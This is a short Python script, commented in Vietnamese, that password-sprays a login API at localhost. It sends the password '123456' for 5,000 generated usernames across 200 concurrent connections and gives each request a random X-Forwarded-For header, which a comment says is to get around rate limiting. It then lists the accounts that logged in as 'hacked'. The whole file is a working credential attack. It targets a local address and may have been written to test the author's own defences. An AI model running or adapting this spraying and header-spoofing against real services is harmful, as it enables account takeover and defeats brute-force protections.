import asyncio
import aiohttp
import time
import os
import random

URL = "http://127.0.0.1:8000/api/auth/login"
COMMON_PASSWORD = "123456" 
TARGET_FILE = "targets.txt"

def prepare_target_file():
    if not os.path.exists(TARGET_FILE):
        print(f"[*] Đang tạo từ điển {TARGET_FILE} chứa 5000 tài khoản mục tiêu...")
        with open(TARGET_FILE, "w") as f:
            for i in range(1, 5001):
                f.write(f"victim_{i}\n")

async def fetch(session, username, password):
    payload = {"username": username, "password": password}
    
    # Sinh IP ngẫu nhiên cho MỖI request để lách Rate Limit
    fake_ip = f"10.0.{random.randint(1, 255)}.{random.randint(1, 255)}"
    headers = {"X-Forwarded-For": fake_ip} 
    
    async with session.post(URL, json=payload, headers=headers) as response:
        return response.status, username

async def main():
    print("🚀 BẮT ĐẦU CHIẾN DỊCH PASSWORD SPRAYING 🚀")
    prepare_target_file() # Mồi sẵn list mục tiêu
    
    with open(TARGET_FILE, "r") as f:
        targets = [line.strip() for line in f.readlines() if line.strip()]
        
    print(f"Mục tiêu: Rải mật khẩu '{COMMON_PASSWORD}' cho {len(targets)} tài khoản...\n")
    
    tasks = []
    # Bắn 200 luồng đồng thời
    async with aiohttp.ClientSession(connector=aiohttp.TCPConnector(limit=200)) as session:
        for username in targets:
            tasks.append(fetch(session, username, COMMON_PASSWORD))
            
        start_time = time.time()
        results = await asyncio.gather(*tasks)
        end_time = time.time()
        
    status_counts = {}
    success_accounts = []
    
    for status, username in results:
        status_counts[status] = status_counts.get(status, 0) + 1
        if status == 200:
            success_accounts.append(username) # Lưu lại tên những đứa bị Hack
        
    print(f"⏱️ Tổng thời gian chạy: {end_time - start_time:.2f} giây")
    print("📊 KẾT QUẢ HTTP CODE:")
    for status, count in status_counts.items():
        if status == 200:
            print(f"  🔥 CODE 200 (HACK THÀNH CÔNG): {count} tài khoản bị lộ mật khẩu!")
        else:
            print(f"  - Code {status}: {count} lượt")
            
    if success_accounts:
        print("\n[+] Trích xuất 5 tài khoản xui xẻo đầu tiên:")
        for acc in success_accounts[:5]:
            print(f"    -> {acc} : {COMMON_PASSWORD}")

if __name__ == "__main__":
    asyncio.run(main())